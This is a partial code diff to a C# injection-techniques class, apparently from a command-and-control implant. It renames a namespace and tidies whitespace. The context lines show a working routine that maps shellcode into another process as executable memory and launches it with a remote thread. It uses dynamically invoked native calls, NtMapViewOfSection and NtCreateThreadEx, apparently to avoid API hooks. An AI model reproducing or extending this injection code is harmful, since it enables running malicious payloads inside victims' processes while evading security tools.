@@ -5,10 +5,9 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
-using DynamicEngLoading;
 using static DynamicEngLoading.h_DynInv.Win32;
 
-namespace Engineer.Extra
+namespace DynamicEngLoading
 {
     public unsafe class Inj_techs
     {
@@ -65,13 +64,13 @@ namespace Engineer.Extra
             {
                 Console.WriteLine(ex.Message);
                 Console.WriteLine(ex.StackTrace);
-                return false; 
+                return false;
             }
-        } 
+        }
 
         public static bool MapViewCreateThread(byte[] shellcode, IntPtr hProcess)
         {
-            
+
 
             var hSection = IntPtr.Zero;
             var maxSize = (ulong)shellcode.Length;
@@ -97,7 +96,7 @@ namespace Engineer.Extra
             h_DynInv_Methods.NtFuncWrapper.NtMapViewOfSection(hSection, hProcess, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref viewSize, (uint)2, (uint)0, (uint)0x20);
 
             //Console.WriteLine($"Mapped view to target");
-            var createThreadResult = h_DynInv_Methods.NtFuncWrapper.NtCreateThreadEx(ref hRemoteThread, WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL,IntPtr.Zero, hProcess, remoteBaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+            var createThreadResult = h_DynInv_Methods.NtFuncWrapper.NtCreateThreadEx(ref hRemoteThread, WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL, IntPtr.Zero, hProcess, remoteBaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
             pinnedBuffer.Free();
             if (createThreadResult == h_DynInv.NTSTATUS.Success)
             {
